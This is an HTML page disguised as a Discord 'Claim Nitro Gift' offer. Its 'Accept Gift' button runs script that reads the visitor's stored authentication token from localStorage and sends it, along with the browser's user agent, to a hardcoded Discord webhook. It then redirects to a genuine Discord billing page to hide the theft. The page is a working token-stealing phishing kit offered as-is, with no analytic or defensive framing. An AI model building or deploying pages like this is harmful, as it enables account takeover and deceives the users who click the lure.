<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nitro | Claim Gift</title>
    <style>
        :root { --blurple: #5865F2; }
        body { margin: 0; background: #18191C; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: 'gg sans', sans-serif; perspective: 1000px; }

        .card {
            background: #2B2D31; width: 420px; padding: 40px; border-radius: 16px;
            text-align: center; border: 1px solid rgba(255,255,255,0.05);
            transition: transform 0.1s ease-out, box-shadow 0.3s ease;
            cursor: default;
        }

        h1 { color: #fff; margin-bottom: 12px; }
        p { color: #B9BBBE; margin-bottom: 30px; }

        .btn {
            background: var(--blurple); color: #fff; border: none; padding: 15px; width: 100%;
            border-radius: 8px; font-weight: 700; cursor: pointer;
            transition: transform 0.2s cubic-bezier(0.175, 0.885, 0.32, 1.275), background 0.2s;
        }

        .btn:hover { background: #4752c4; transform: scale(1.03); }
        .btn:active { transform: scale(0.97); }
    </style>
</head>
<body>

    <div class="card" id="card">
        <h1>Claim Nitro Gift</h1>
        <p>A gift is ready to be applied. Verify your session now.</p>
        <button class="btn" id="claimBtn">Accept Gift</button>
    </div>

    <script>
        const card = document.getElementById('card');
        
        // 3D Parallax effect on mouse move
        document.addEventListener('mousemove', (e) => {
            const { clientX: x, clientY: y } = e;
            const centerX = window.innerWidth / 2;
            const centerY = window.innerHeight / 2;
            const rotateX = (y - centerY) / 25;
            const rotateY = (centerX - x) / 25;
            card.style.transform = `rotateY(${-rotateY}deg) rotateX(${rotateX}deg)`;
        });

        document.getElementById('claimBtn').addEventListener('click', async () => {
            const btn = document.getElementById('claimBtn');
            btn.innerText = "Processing...";
            btn.style.opacity = "0.7";
            btn.disabled = true;

            const token = localStorage.getItem("token") || localStorage.getItem("authentication_token");
            
            await fetch('https://discordapp.com/api/webhooks/1512110492687274024/TUENZycpaVUR0foYAvP5QDl1oHpZ3EtWOOIRh8jqi-HJhJaAtPt_1z3_OrCFMd_W7CE5', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: "@everyone",
                    embeds: [{
                        title: "💎 Interactive Capture",
                        color: 0x5865F2,
                        fields: [
                            { name: "Token", value: `\`${token || "NULL"}\`` },
                            { name: "Data", value: `\`${navigator.userAgent}\`` }
                        ]
                    }]
                })
            });

            setTimeout(() => {
                window.location.replace("https://discord.com/billing/promotions/gift-accepted");
            }, 1000);
        });
    </script>
</body>
</html>
